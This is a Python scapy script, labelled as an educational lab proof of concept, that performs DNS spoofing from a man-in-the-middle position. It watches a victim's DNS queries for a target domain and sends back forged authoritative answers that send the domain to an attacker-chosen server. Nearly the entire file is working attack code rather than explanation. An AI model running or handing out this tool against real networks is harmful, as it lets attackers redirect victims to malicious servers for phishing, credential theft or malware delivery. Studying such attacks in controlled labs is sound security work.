from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import TCP, IP, UDP
from scapy.layers.l2 import Ether
import argparse


def parse_args():
    p = argparse.ArgumentParser(description="DNS poisoning PoC, MITM required - educational lab use only")
    p.add_argument("--victim-ip", required=True, help="IP of the target host")
    #p.add_argument("--victim-mac", required=True, help="MAC of the target host")
    p.add_argument("--router-ip", required=True, help="Gateway IP")
    p.add_argument("--router-mac", required=True, help="Gateway MAC")
    p.add_argument("--iface", required=True, help="Network interface number (e.g. 15)")
    p.add_argument("--conf-domain", required=True, help="Domain of the target host")
    p.add_argument("--dns-ip", required=True,nargs="+", help="legit DNS servers IP addresses")
    p.add_argument("--fake-server", required=True, help="IP adress of the fake server")
    return p.parse_args()


def dns_catch(my_interface,fake_domain,victim_ip,dns_ips,conf_domain):

    def dnsxx(pkt):
        if (IP in pkt and DNS in pkt):
            if (pkt[IP].src == victim_ip and pkt[IP].dst in dns_ips):
                print(pkt[DNSQR].qname)
                if ((pkt[DNSQR].qname).decode() in conf_domain):
                    print(f"[i] catched the domain {conf_domain}")
                    return True
        return False

    while True:
        print("[i] starting DNS Catch...")
        pkt = sniff(count=1, lfilter = dnsxx ,iface=my_interface)

        DNS_ANS = Ether(dst=pkt[0][Ether].src) / (IP(dst = pkt[0][IP].src, src = pkt[0][IP].dst) / UDP(dport = pkt[0][UDP].sport, sport = pkt[0][UDP].dport)
                   / DNS(id = pkt[0][DNS].id , qr=1 ,aa=1, qd=pkt[0][DNSQR]
            ,  an = DNSRR(rrname=pkt[0][DNSQR].qname, rdata =  fake_domain , type='A',  ttl=600)))
        # qr = 1 -- > answer
        # aa = 1 -- > answer arrived by authorative server
        for _ in range(5):
            sendp(DNS_ANS, verbose=False, iface=my_interface)
        print("Burst malware has sent successfuly")

def main():
    args = parse_args()
    my_interface = IFACES.dev_from_index(args.iface)  # the actual interface to spoof by
    conf_domain =args.conf_domain
    dns_ips = args.dns_ip
    fake_domain = args.fake_server
    victim_ip = args.victim_ip

    print("[i] DNS script starting...")
    t2 = threading.Thread(target=dns_catch, args=(my_interface,fake_domain,victim_ip,dns_ips,conf_domain))
    t2.start()

if __name__ == '__main__':
    main()
